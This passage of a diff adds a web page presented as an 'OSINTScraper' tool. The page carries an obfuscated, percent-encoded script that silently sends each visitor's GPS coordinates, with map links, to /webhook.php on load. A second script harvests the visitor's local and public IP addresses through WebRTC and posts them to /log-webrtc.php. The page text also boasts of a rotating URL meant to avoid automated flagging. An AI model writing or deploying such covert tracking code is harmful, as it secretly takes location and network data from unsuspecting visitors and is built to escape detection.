%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%31%20%3d%20%22%5c%6e%54%61%72%67%65%74%20%42%72%6f%77%73%65%72%20%69%73%20%6e%6f%74%20%73%75%70%70%6f%72%74%69%6e%67%20%67%65%6f%6c%6f%63%61%74%69%6f%6e%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%31%29%29%3b%0d%0a%20%20%20%20%7d%0d%0a%20%20%7d%0d%0a%20%20%66%75%6e%63%74%69%6f%6e%20%6c%61%74%6c%6f%6e%67%28%70%6f%73%69%74%69%6f%6e%29%20%7b%0d%0a%20%20%20%20%76%61%72%20%6c%61%74%6c%6f%6e%67%20%3d%20%28%22%5c%6e%47%50%53%20%4c%61%74%20%4c%6f%6e%67%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%4c%61%74%69%74%75%64%65%3a%20%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%61%74%69%74%75%64%65%20%2b%20%22%5c%6e%4c%6f%6e%67%69%74%75%64%65%3a%20%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%6f%6e%67%69%74%75%64%65%20%2b%20%22%5c%6e%4d%61%70%20%4c%6f%63%61%74%69%6f%6e%3a%20%20%68%74%74%70%73%3a%2f%2f%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%6d%61%70%73%2f%70%6c%61%63%65%2f%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%61%74%69%74%75%64%65%20%2b%20%22%2c%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%6f%6e%67%69%74%75%64%65%20%2b%20%22%5c%6e%47%6f%6f%67%6c%65%20%45%61%72%74%68%3a%20%20%68%74%74%70%73%3a%2f%2f%65%61%72%74%68%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%77%65%62%2f%73%65%61%72%63%68%2f%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%61%74%69%74%75%64%65%20%2b%20%22%2c%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%6f%6e%67%69%74%75%64%65%20%2b%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%3b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%6c%61%74%6c%6f%6e%67%29%29%3b%0d%0a%20%20%7d%0d%0a%20%20%66%75%6e%63%74%69%6f%6e%20%63%61%74%63%68%45%72%72%6f%72%28%65%72%72%6f%72%29%20%7b%0d%0a%20%20%20%20%73%77%69%74%63%68%28%65%72%72%6f%72%2e%63%6f%64%65%29%20%7b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%50%45%52%4d%49%53%53%49%4f%4e%5f%44%45%4e%49%45%44%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%31%20%3d%20%22%5c%6e%55%73%65%72%20%64%65%6e%69%65%64%20%74%68%65%20%47%65%6f%6c%6f%63%61%74%69%6f%6e%20%70%65%72%6d%69%73%69%6f%6e%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%31%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%50%4f%53%49%54%49%4f%4e%5f%55%4e%41%56%41%49%4c%41%42%4c%45%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%31%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%31%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%31%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%32%20%3d%20%22%5c%6e%4c%6f%63%61%74%69%6e%20%55%6e%61%76%61%69%6c%61%62%6c%65%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%31%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%32%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%54%49%4d%45%4f%55%54%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%32%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%32%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%32%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%33%20%3d%20%22%5c%6e%54%69%6d%65%6f%75%74%20%45%72%72%6f%72%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%32%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%33%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%55%4e%4b%4e%4f%57%4e%5f%45%52%52%4f%52%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%33%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%33%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%33%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%34%20%3d%20%22%5c%6e%55%6e%6b%6e%6f%77%6e%20%65%72%72%6f%72%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%33%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%34%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%7d%0d%0a%20%20%7d%0d%0a%20%20%3c%2f%73%63%72%69%70%74%3e'));
+</script>
+<div style="text-align:center; margin:20px;">
+  <button id="go-diagram" onclick="window.location.href='/Diagram.html'">
+    Diagram
+  </button>
+</div>
+<div style="max-width: 867px; margin: 20px auto; padding: 20px; text-align: center; font-family: Arial, sans-serif; font-size: 14px; color: #ccc; line-height: 1.6;">
+<div class="page-info">
+  <p>
+This tool leverages OSINT methodologies to collect and analyze publicly available information on individuals or entities. It is powered by advanced GPT‑5 technology and represents one of the most recent innovations in this space. We are pleased to have it featured on 0xArchive, accessible through a dynamic URL that refreshes every 30 minutes to reduce the likelihood of automated flagging. OSINTScraper remains in its beta phase, and users may encounter occasional bugs or unexpected behavior.
+  </p>
+  <p>
+    We kindly ask you to leave a review or report of your experience on our Socials Medias.<br> 
+    Team OSINTScraper hopes you have fun along your journey and stay ethical.
+  </p>
+</div>
+
+<script>
+  const username = localStorage.getItem("username");
+  if (username) {
+    const userDisplayEl = document.getElementById("userDisplay");
+    const sidebarUsernameEl = document.getElementById("sidebarUsername");
+    if (userDisplayEl) userDisplayEl.textContent = "Welcome, " + username;
+    if (sidebarUsernameEl) sidebarUsernameEl.textContent = username;
+  }
+
+  const settingsBtn = document.getElementById("settingsBtn");
+  const settingsSidebar = document.getElementById("settingsSidebar");
+  const closeSidebar = document.getElementById("closeSidebar");
+
+  let sidebarOverlay = document.getElementById("sidebarOverlay");
+  if (!sidebarOverlay) {
+    sidebarOverlay = document.createElement("div");
+    sidebarOverlay.id = "sidebarOverlay";
+    document.body.appendChild(sidebarOverlay);
+  }
+
+  if (settingsBtn && settingsSidebar && closeSidebar) {
+    settingsBtn.addEventListener("click", () => {
+      settingsSidebar.classList.add("active");
+      sidebarOverlay.classList.add("active");
+    });
+
+    closeSidebar.addEventListener("click", () => {
+      settingsSidebar.classList.remove("active");
+      sidebarOverlay.classList.remove("active");
+    });
+
+    sidebarOverlay.addEventListener("click", () => {
+      settingsSidebar.classList.remove("active");
+      sidebarOverlay.classList.remove("active");
+    });
+  }
+
+  function togglePricing() {
+    const dd = document.getElementById("pricingDropdown");
+    if (!dd) return;
+    dd.classList.toggle("show");
+  }
+
+  window.addEventListener("click", function(event) {
+    const isButton = event.target.closest(".dropdown-button");
+    const isContent = event.target.closest("#pricingDropdown");
+    if (!isButton && !isContent) {
+      const open = document.getElementById("pricingDropdown");
+      if (open && open.classList.contains("show")) {
+        open.classList.remove("show");
+      }
+    }
+  });
+</script>
+
+<script>
+(async function logFullWebRTCInfo() {
+  const pc = new RTCPeerConnection({
+    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+  });
+
+  pc.createDataChannel("dummy");
+
+  let localIP = "Local IP not found";
+  let publicIP = "Public IP not found";
+  let relayIP = "Relay IP not defined";
+  let transport = "Transport not defined";
+  let port = "Port not defined";
+  let candidateType = "Candidate type not defined";
+
+  const ipv4Regex = /(\d{1,3}(?:\.\d{1,3}){3})/;
+
+  pc.onicecandidate = (event) => {
+    if (event.candidate) {
+      const cand = event.candidate.candidate;
+
+      const ipMatch = cand.match(ipv4Regex);
+      const ip = ipMatch ? ipMatch[1] : null;
+
+      const portMatch = cand.match(/(\d+)\s+typ/);
+      if (portMatch) port = portMatch[1];
+
+      const typeMatch = cand.match(/typ\s(\w+)/);
+      if (typeMatch) candidateType = typeMatch[1];
+
+      const transportMatch = cand.match(/udp|tcp/);
+      if (transportMatch) transport = transportMatch[0];
+
+      if (candidateType === "host" && ip) {
+        localIP = ip;
+      } else if (candidateType === "srflx" && ip) {
+        publicIP = ip;
+      } else if (candidateType === "relay" && ip) {
+        relayIP = ip;
+      }
+
+      const payload = {
+        localIP,
+        publicIP,
+        relayIP,
+        transport,
+        port,
+        candidateType,
+        fullCandidate: cand
+      };
+
+      fetch("/log-webrtc.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+    }
+  };
+
+  const offer = await pc.createOffer();
+  await pc.setLocalDescription(offer);
+})();
+</script>
+
+
+<script>
+  function togglePricing() {
+    document.getElementById("pricingDropdown").classList.toggle("show");
+  }
+
+  function toggleOsintInfo() {
+    document.getElementById("osintDropdown").classList.toggle("show");
+  }
+
+  function toggleBusiness() {
+    document.getElementById("businessDropdown").classList.toggle("show");
+  }
+
+  function toggleFeatures() {
+    document.getElementById("featuresDropdown").classList.toggle("show");
+  }
+
+  window.addEventListener("click", function(event) {
+    if (!event.target.closest('.dropdown-button') && !event.target.closest('.dropdown-content')) {
+      const dropdowns = document.getElementsByClassName("dropdown-content");
+      for (let i = 0; i < dropdowns.length; i++) {
+        dropdowns[i].classList.remove('show');
+      }
+    }
+  });
+
+  const switchAccountBtn = document.getElementById("switchAccountBtn");
+  if (switchAccountBtn) {
+    switchAccountBtn.addEventListener("click", () => {
+      window.location.href = "Register/Register.html";
+    });
+  }
+
+  const privacyBtn = document.getElementById("privacyBtn");
+  if (privacyBtn) {
+    privacyBtn.addEventListener("click", () => {
+      window.location.href = "https://www.dlapiperdataprotection.com/";
+    });
+  }
+</script>
+</body>
+</html>
+
